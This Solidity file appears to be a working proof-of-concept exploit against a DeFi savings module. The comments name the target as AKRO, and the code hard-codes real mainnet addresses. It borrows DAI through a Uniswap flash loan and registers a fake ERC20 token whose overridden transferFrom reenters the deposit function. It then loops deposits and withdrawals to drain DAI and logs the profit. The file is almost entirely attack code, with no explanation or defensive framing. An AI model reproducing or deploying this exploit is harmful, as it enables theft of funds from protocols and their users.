pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ISavingsModule.sol";
import "./IUniswapV2Pair.sol";
import "./ICurveFiProtocol_Y.sol";

contract Test is ERC20 {
    address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;
    address dyPoolToken = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077;
    // AKRO contract
    ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
    // DAI/WETH pair for flashloan
    address Pair1 = 0xB20bd5D04BE54f870D5C0d3cA85d82b34B836405;
    // IUniswapV2Pair pair1 = IUniswapV2Pair(Pair1);
    // ERC20 usdt = ERC20()

   
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); 
    ERC20 dyPool = ERC20(0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077); 
    ICurveFiProtocol_Y AkroYPool = ICurveFiProtocol_Y(curveYPool); 

    uint borrow = 25000*10**18;
    uint deposit = 24000*10**18;
    uint repay = (borrow * 100301) / 100000;
    uint dyPoolBalance;
    uint daiBalance;
    uint thisSupply = 500000;
    uint nDepositDai;
    uint nDepositFake;
    uint nBalance;
    uint loops;


    event DyPoolBalance(uint indexed state, uint indexed dyBalance);
    event ReEntered(uint indexed dyPoolBalance);

    constructor() payable ERC20("teste","T") {
        dai.approve(address(savingsModule),uint(-1));
        dyPool.approve(address(savingsModule),uint(-1));

        address poolToken = savingsModule.poolTokenByProtocol(curveYPool);
        console.log("poolToken",poolToken);
    }  

    function run(uint _loops) external {
        loops = _loops;
        console.log("start");
        pair.swap(borrow,0,address(this),"0x");
    }

    function uniswapV2Call(address,uint,uint,bytes calldata) external {
        console.log("start swap");

        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dyPoolBalance     ",dyPoolBalance);
        // emit DyPoolBalance(0,dyPoolBalance);
        console.log("this address DAI:  ",dai.balanceOf(address(this)));

        uint[] memory amountsIn = new uint[](1);
        amountsIn[0] = thisSupply;
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = address(this);
        nDepositFake = savingsModule.deposit(curveYPool,tokensIn,amountsIn);
        console.log("nDepositFake:   ",nDepositFake );
        console.log("dyPoolBalance:  ",dyPoolBalance);


        console.log("first attack finshed!");


        nBalance = AkroYPool.normalizedBalance();
        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dePoolBalance:   ",dyPoolBalance);
        savingsModule.withdraw(curveYPool,address(dai),dyPoolBalance*99/100,0);
        console.log("withdraw:    ",dyPoolBalance*99/100);
        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("this address depool left:  ",dyPoolBalance);

        for (uint i = 0;i < loops;i++){
            savingsModule.deposit(curveYPool,tokensIn,amountsIn);
            dyPoolBalance = dyPool.balanceOf(address(this));
            savingsModule.withdraw(curveYPool,address(dai),dyPoolBalance*99/100,0);
            console.log("withdraw:   ",dyPoolBalance*99/100);
            console.log("---------------  ",i);
        }

        bool daiSuccess = dai.transfer(address(pair),repay);
        daiBalance = dai.balanceOf(address(this));
        console.log("profit -- DAI: ", daiBalance / 10**18);
    }

    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {
        console.log("transferFrom");
        address[] memory tokensIn = new address[](1);
        uint[] memory amountsIn = new uint[](1);
        tokensIn[0] = address(dai);
        amountsIn[0] = deposit;
        nDepositDai = savingsModule.deposit(curveYPool,tokensIn,amountsIn);
        console.log("nDepositDai  :",nDepositDai);

        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dypoolBanlance:  ",dyPoolBalance);

        return dai.transferFrom(address(this),curveYPool,1*10**18);
    }
    receive() external payable {}

}